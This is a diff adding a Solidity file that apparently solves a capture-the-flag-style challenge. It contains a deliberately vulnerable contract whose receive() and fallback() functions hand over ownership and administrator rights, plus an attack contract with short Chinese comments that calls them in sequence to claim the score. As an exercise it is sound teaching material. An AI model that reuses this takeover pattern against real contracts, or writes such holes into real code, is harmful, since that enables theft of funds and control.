@@ -1,0 +1,74 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract recei {
+    mapping(address => uint256) public contributions;
+    address public owner;
+    address public administration;
+    uint256 public score;
+
+    constructor() {
+        contributions[msg.sender] = 10000000 ether;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function contribute() public payable {
+        require(msg.value < 0.001 ether);
+        contributions[msg.sender] += msg.value;
+        if (contributions[msg.sender] > contributions[owner]) {
+            owner = msg.sender;
+        }
+    }
+
+    function getContribution() public view returns (uint256) {
+        return contributions[msg.sender];
+    }
+
+    receive() external payable {
+        require(msg.value > 0 && contributions[msg.sender] > 0);
+        owner = msg.sender;
+    }
+
+    fallback() external payable {
+        require(msg.value > 0 && msg.sender == owner);
+        administration = msg.sender;
+    }
+
+    function isCompleted()public{
+        score=0;
+        if (owner == msg.sender){
+            score+=50;
+        }
+        if(administration == msg.sender){
+            score+=50;
+        }
+    }
+}
+contract att{
+    recei public r;
+    constructor(address payable  add) public payable 
+    {
+        r=recei(add);
+    }
+    function a1()public payable 
+    {
+        r.contribute{value: 10000 wei}();//给contribute函数转账使contributions[msg.sender]改变
+    }
+        function a2() public payable 
+    {
+         (bool success, ) = address(r).call{value: 10000 wei}("");//触发receive函数
+        require(success, "Transfer failed");
+    }
+    function a3() public payable 
+    {
+        address(r).call{value:100000 wei}(abi.encodePacked(bytes4(keccak256("nonExistentFunction()"))));//触发fallback函数
+    }
+    function a4() public 
+    {
+        r.isCompleted();
+    }
+}
